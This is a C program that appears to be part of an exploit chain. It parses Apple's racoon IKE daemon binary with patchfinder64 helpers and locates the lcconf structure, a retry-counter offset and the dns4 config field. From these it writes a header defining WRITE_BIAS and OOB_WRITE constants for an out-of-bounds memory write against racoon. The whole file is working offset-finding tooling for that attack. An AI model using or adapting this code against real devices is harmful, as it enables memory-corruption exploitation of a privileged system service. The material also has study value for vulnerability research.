#include <assert.h>
#include <err.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
#include <mach-o/loader.h>

#include "patchfinder64.c"

static addr_t
offsetof__struct_localconf__retry_counter(const uint8_t *p, off_t sz)
{
    addr_t ref, bof, call, val;
    uint8_t *q = boyermoore_horspool_memmem(p, sz, (uint8_t *)"Adding NON-ESP marker\n", sizeof("Adding NON-ESP marker\n") - 1);
    assert(q);
    ref = xref64(p, 0, q - p, q - p);
    assert(ref);
    bof = bof64(p, 0, ref);
    assert(bof);
    call = find_call64(p, bof, ref - bof);
    assert(call);
    val = calc64(p, bof, call, 8);
    assert(val);
    return val;
}

static addr_t
addressof__lcconf(const uint8_t *p, off_t sz)
{
    addr_t ref, bof, call, val;
    uint8_t *q = boyermoore_horspool_memmem(p, sz, (uint8_t *)"Adding NON-ESP marker\n", sizeof("Adding NON-ESP marker\n") - 1);
    assert(q);
    ref = xref64(p, 0, q - p, q - p);
    assert(ref);
    bof = bof64(p, 0, ref);
    assert(bof);
    call = find_call64(p, bof, ref - bof);
    assert(call);
    val = calc64(p, bof, call, 26);
    assert(val);
    return val;
}

static addr_t
addressof__isakmp_cfg_config__dns4(const uint8_t *p, off_t sz)
{
    addr_t ref, bof, call, val;
    uint8_t *q = boyermoore_horspool_memmem(p, sz, (uint8_t *)"bad IPv4 DNS address.", sizeof("bad IPv4 DNS address.") - 1);
    assert(q);
    ref = xref64(p, 0, q - p, q - p);
    assert(ref);
    val = calc64(p, ref - 64, ref, 10);
    assert(val);
    val -= 12;
    return val;
}

static int
really(const uint8_t *p, off_t sz, const char *output)
{
    addr_t bias = offsetof__struct_localconf__retry_counter(p, sz);
    long lcconf = addressof__lcconf(p, sz);
    long dns4 = addressof__isakmp_cfg_config__dns4(p, sz);
    long distance = (lcconf - dns4) / 4;
    FILE *f = stdout;
    if (output) {
        f = fopen(output, "wt");
    }
    fprintf(f, "// automatically generated by rocky. do not edit\n");
    fprintf(f, "#define WRITE_BIAS 0x%llx\n", bias);
    fprintf(f, "#define OOB_WRITE %ld\n", distance);
    if (output) {
        fclose(f);
    }
    return 0;
}

static int
do_the_racoon(const char *filename, const char *output)
{
    int rv;
    int fd;
    uint8_t *p;
    off_t sz;

    fd = open(filename, O_RDONLY);
    if (fd < 0) {
        fprintf(stderr, "error: cannot open %s\n", filename);
        return -1;
    }

    sz = lseek(fd, 0, SEEK_END);

    p = mmap(NULL, sz, PROT_READ, MAP_PRIVATE, fd, 0);
    if (p == MAP_FAILED) {
        close(fd);
        fprintf(stderr, "error: cannot map %s\n", filename);
        return -1;
    }

    assert(MACHO(p));
    rv = really(p, sz, output);

    munmap(p, sz);
    close(fd);

    if (rv != 0) {
        fprintf(stderr, "error: cannot parse %s\n", filename);
        return -1;
    }

    return 0;
}

int
main(int argc, char **argv)
{
    if (argc < 2) {
        printf("usage: %s racoon [output]\n", argv[0]);
        return 1;
    }
    return do_the_racoon(argv[1], argv[2]);
}
